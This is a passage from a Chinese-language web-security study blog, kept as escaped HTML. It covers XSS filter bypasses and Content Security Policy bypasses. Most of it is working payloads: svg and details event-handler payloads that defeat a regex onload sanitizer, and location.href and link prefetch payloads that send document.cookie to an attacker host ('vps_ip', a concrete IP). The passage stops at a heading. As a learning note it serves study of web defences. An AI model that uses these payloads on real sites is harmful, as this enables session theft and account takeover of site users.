&lt;p&gt;或&lt;/p&gt;
&lt;p&gt;通过条件竞争&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;details open ontoggle=alert(1)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;补丁绕过&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;export const TAG_NAME = &amp;#x27;[A-Za-z][A-Za-z0-9-]*&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;const reXSSOnload = new RegExp(`(&amp;lt;$&amp;#123;TAG_NAME&amp;#125;[^&amp;gt;]*)(onload\s*=)`, &amp;#x27;ig&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export function sanitizeHTML(html: string) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    const root = document.createElement(&amp;#x27;div&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (isString(html)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        html = html.replace(reComment, &amp;#x27;&amp;#x27;).replace(reXSSOnload, &amp;#x27;$1&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        root.innerHTML = html;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    // ...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;1. 贪婪模式导致绕过&lt;/p&gt;
&lt;p&gt;正则在标签名 &lt;code&gt;[A-Za-z][A-Za-z0-9-]*&lt;/code&gt;  的后面，使用了 &lt;code&gt;[^&amp;gt;]*&lt;/code&gt;  来匹配非 &lt;code&gt;&amp;gt;&lt;/code&gt;  的所有字符。&lt;/p&gt;
&lt;p&gt;如果此时有两个 &lt;code&gt;onload=&lt;/code&gt; ，那么这个 &lt;code&gt;[^&amp;gt;]*&lt;/code&gt;  将会匹配到第二个，而将它删除掉，而第一个 &lt;code&gt;onload=&lt;/code&gt;  将被保留。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg&amp;gt;&amp;lt;svg onload=alert(1) onload=alert(2)&amp;gt;&amp;lt;/svg&amp;gt;&amp;lt;/svg&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;2. 非贪婪绕过&lt;/p&gt;
&lt;p&gt;即使改成非贪婪模式，删除掉的是第一个 &lt;code&gt;onload=&lt;/code&gt; ，第二个 &lt;code&gt;onload=&lt;/code&gt;  仍然会保留，所以无法解决问题，构造的 Payload 如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;p&amp;gt;&amp;lt;svg&amp;gt;&amp;lt;svg onload=onload=alert(1)&amp;gt;&amp;lt;/svg&amp;gt;&amp;lt;/svg&amp;gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;正则优化：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(&amp;lt;[A-Za-z][A-Za-z0-9-]*\s)([onload=]*))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;3. 字符匹配导致问题&lt;/p&gt;
&lt;p&gt;如果这个正则匹配上 HTML 属性中的一个 &lt;code&gt;&amp;gt;&lt;/code&gt; ，则会停止向后匹配，这样 &lt;code&gt;onload=&lt;/code&gt;  也能保留下来。Payload 如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg&amp;gt;&amp;lt;svg x=&amp;quot;&amp;gt;&amp;quot; onload=alert(1)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;总结&lt;/p&gt;
&lt;p&gt;1. 用户交互型&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;svg use 属性，base64 编码，绕过 JavaScript 关键字&lt;/p&gt;
&lt;p&gt;svg use 属性，charset=ISO-2022-jp，Chrome 忽略特定字符，导致 JavaScript 关键字消失&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;2. 非用户交互型&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1. 条件竞争&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg&amp;gt;&amp;lt;svg onload&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;detail ontoggle=alert(1)&amp;gt; //在黑名单删除details标签前，就已经将ontoggle事件加载进事件队列中即使删除也会执行&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;2. 绕过补丁&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1.绕过贪婪匹配&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;由于贪婪匹配一直会匹配到没有匹配的元素为止，利用两个onload，将会忽略第一个onlad&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg&amp;gt;&amp;lt;svg onload=alert(1) onload=alert(2)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2.绕过非贪婪匹配&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;由于非贪婪只匹配第一个元素，导致第一个onload被删除，第二个onload得以保留&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;p&amp;gt;&amp;lt;svg&amp;gt;&amp;lt;svg onload=onload=alert(1)&amp;gt;&amp;lt;/svg&amp;gt;&amp;lt;/svg&amp;gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3.字符匹配&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;正则表达式遇到&amp;gt;就结束&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg&amp;gt;&amp;lt;svg x=&amp;quot;&amp;gt;&amp;quot; onload=alert(1)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;csp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#csp&#34;&gt;#&lt;/a&gt; CSP&lt;/h2&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDQwNDQwMjE3NTEtZDhmZmI2YTQtYzJhYi00YzRhLWE1N2YtMGQ1MDY2NDVmZWIyLm1k&#34;&gt;📎CSP 常规绕过思路.md&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;CSP（Content Security Policy，内容安全策略），是网页应用中常见的一种安全保护机制，它实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，哪些不可以&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;通过响应包头（Response Header）实现：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight csp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Content-Security-policy&lt;/span&gt;: &lt;span class=&#34;keyword&#34;&gt;default-src&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;self&amp;#x27;&lt;/span&gt;; &lt;span class=&#34;keyword&#34;&gt;script-src&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;self&amp;#x27;&lt;/span&gt; allowed.com; &lt;span class=&#34;keyword&#34;&gt;img-src&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;self&amp;#x27;&lt;/span&gt; allowed.com; &lt;span class=&#34;keyword&#34;&gt;style-src&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;self&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;通过 HTML 元标签实现：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight csp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;meta http-equiv=&amp;quot;Content-Security-Policy&amp;quot; content=&amp;quot;&lt;span class=&#34;keyword&#34;&gt;default-src&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;self&amp;#x27;&lt;/span&gt;; &lt;span class=&#34;keyword&#34;&gt;img-src&lt;/span&gt; https://*; &lt;span class=&#34;keyword&#34;&gt;child-src&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;none&amp;#x27;&lt;/span&gt;;&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;除了 Content-Security-Policy，还有一个 Content-Security-Policy-Report-Only 字段，表示不执行限制选项，只是记录违反限制的行为。它必须与 report-uri 选项配合使用。&lt;/p&gt;
&lt;figure class=&#34;highlight csp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Content-Security-Policy-Report-Only&lt;/span&gt;: &lt;span class=&#34;keyword&#34;&gt;default-src&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;self&amp;#x27;&lt;/span&gt;; ...; &lt;span class=&#34;keyword&#34;&gt;report-uri&lt;/span&gt; /my_amazing_csp_report_parser;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;csp指令值&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#csp指令值&#34;&gt;#&lt;/a&gt; CSP 指令值&lt;/h3&gt;
&lt;p&gt;介绍完 CSP 的指令，下面介绍一下指令值，即允许或不允许的资源&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;*： 星号表示允许任何 URL 资源，没有限制；&lt;/li&gt;
&lt;li&gt;self： 表示仅允许来自同源（相同协议、相同域名、相同端口）的资源被页面加载；&lt;/li&gt;
&lt;li&gt;data：仅允许数据模式（如 Base64 编码的图片）方式加载资源；&lt;/li&gt;
&lt;li&gt;none：不允许任何资源被加载；&lt;/li&gt;
&lt;li&gt;unsafe-inline：允许使用内联资源，例如内联 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;  标签，内联事件处理器，内联 &lt;code&gt;&amp;lt;style&amp;gt;&lt;/code&gt;  标签等，但出于安全考虑，不建议使用；&lt;/li&gt;
&lt;li&gt;nonce：通过使用一次性加密字符来定义可以执行的内联 js 脚本，服务端生成一次性加密字符并且只能使用一次；&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;下面通过具体的例子来看看 CSP 指令和指令值的用法：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;img src=image.jpg&amp;gt;&lt;/code&gt;  该图片来自&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9saW5rLnNlZ21lbnRmYXVsdC5jb20vP2VuYz1zVml1bndJZVJJN3Z1TSUyRkhOR0NNcUElM0QlM0QuWEJKcDJWbUhSTEpkblE4SCUyQk1LbmZxS3JqampabEh6b0h1eXltTXB2VktRJTNE&#34;&gt; https://example.com&lt;/span&gt; 将被允许载入，因为是同源资源；&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;script src=script.js&amp;gt;&lt;/code&gt;  该 js 脚本来自&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9saW5rLnNlZ21lbnRmYXVsdC5jb20vP2VuYz13bXlvQ05zZnZhTVdUckxuZWREZkJRJTNEJTNELjBKWmNPNSUyRnowS1dOcWVlb0V1QWVVSXJsVVRmRFlwd3RUTGp0QlFUaXFEMCUzRA==&#34;&gt; https://example.com&lt;/span&gt; 将被允许载入，因为是同源资源；&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;script src=https://examples.com/script.js&amp;gt;&lt;/code&gt; ，该 js 脚本将不允许被加载执行，因为来自&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9saW5rLnNlZ21lbnRmYXVsdC5jb20vP2VuYz11NnE3QXR2M0t6RTFGbWtRaXJCeE1nJTNEJTNELjdQQm81JTJGWUs3bU5wSVZZNkUlMkZ0Z082ME5PZE1YUWlOUUtpeTBFbzZOUk9ZJTNE&#34;&gt; https://examples.com&lt;/span&gt;， 非同源；&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucnVhbnlpZmVuZy5jb20vYmxvZy8yMDE2LzA5L2NzcC5odG1s&#34;&gt;Content Security Policy 入门教程 - 阮一峰的网络日志 (ruanyifeng.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;CSP 绕过&lt;/p&gt;
&lt;p&gt;1.location.href 绕过&lt;/p&gt;
&lt;p&gt;服务端代码&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (!isset($_COOKIE[&amp;#x27;a&amp;#x27;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        setcookie(&amp;#x27;a&amp;#x27;,md5(rand(0,1000)));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        header(&amp;quot;Content-Security-Policy: default-src &amp;#x27;self&amp;#x27;;script-src &amp;#x27;unsafe-inline&amp;#x27;&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;title&amp;gt;CSP Test&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;h2&amp;gt;CSP-safe&amp;lt;/h2&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (isset($_GET[&amp;#x27;a&amp;#x27;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        echo &amp;quot;Your GET content&amp;quot;.@$_GET[&amp;#x27;a&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;//&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;本地代码，模拟接收 cookie&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	if (isset($_GET[&amp;#x27;xss&amp;#x27;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        echo &amp;quot;Your GET content&amp;quot;.@$_GET[&amp;#x27;xss&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;//&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个地方可以用 location 跳转：location.href (window.location/window.open) 绕过&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?a=&amp;lt;script&amp;gt;location.href=&amp;quot;http://127.0.0.1&amp;quot;+document.cookie;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在我们已经可以执行任意 js 脚本但由于 CSP 的阻拦我们的 cookie 无法带外传输，就可以用此方法，注意编码 %2B&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;location.href = &amp;quot;vps_ip:xxxx?&amp;quot;+document.cookie&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://101.35.139.208:9999/csp.php?a=&amp;lt;script&amp;gt;location.href=&amp;quot;http://127.0.0.1:18888/csp.php?xss=&amp;quot;%2bdocument.cookie;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;利用前提：存在 XSS，可以执行任意 js 脚本，但由于 CSP 无法数据外带。&lt;/p&gt;
&lt;p&gt;​					CSP 规则 &lt;code&gt;header(&amp;quot;Content-Security-Policy: default-src &#39;self&#39;;script-src:&#39;unsafe-inline&#39;;&amp;quot;);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;2.link 绕过 (失效)&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!-- firefox --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;link rel=&amp;quot;dns-prefetch&amp;quot; href=&amp;quot;//$&amp;#123;cookie&amp;#125;.vps_ip&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!-- chrome --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;link rel=&amp;quot;prefetch&amp;quot; href=&amp;quot;//vps_ip?$&amp;#123;cookie&amp;#125;&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;外带：&lt;/p&gt;
